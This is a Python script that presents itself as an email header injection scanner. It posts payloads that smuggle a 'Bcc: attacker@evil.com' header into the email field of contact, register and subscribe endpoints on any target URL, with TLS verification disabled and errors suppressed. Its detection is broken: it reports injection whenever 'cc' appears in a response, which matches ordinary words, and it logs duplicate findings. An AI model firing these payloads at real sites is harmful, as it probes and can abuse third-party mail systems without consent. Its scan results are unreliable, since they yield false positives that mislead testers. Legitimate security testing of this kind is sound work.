#!/usr/bin/env python3
"""
Email Injection Scanner
Tests for email header injection vulnerabilities
"""

import requests
import argparse
import warnings
warnings.filterwarnings('ignore')

PAYLOADS = [
    "test@example.com%0aBcc: attacker@evil.com",
    "test@example.com\r\nBcc: attacker@evil.com",
    "test@example.com%0d%0aBcc: attacker@evil.com",
    "test@example.com; Bcc: attacker@evil.com",
    '"foreignEmail"@evil.com',
    "test@example.com\nBcc: attacker@evil.com",
]

def scan(target):
    print(f"[*] Email Injection Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    found = []
    email_paths = ['/contact', '/register', '/subscribe', '/api/contact', '/api/register']
    
    for path in email_paths:
        url = target + path
        for payload in PAYLOADS:
            try:
                r = requests.post(url, data={'email': payload}, timeout=10, verify=False)
                if 'bcc' in r.text.lower() or 'cc' in r.text.lower():
                    print(f"[!] Possible injection: {path}")
                    found.append(path)
            except:
                pass
    
    print("\n" + "="*50)
    if found:
        print(f"[!] Found {len(found)} potential issues")
    else:
        print("[*] No email injection detected")
    
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Email Injection Scanner')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)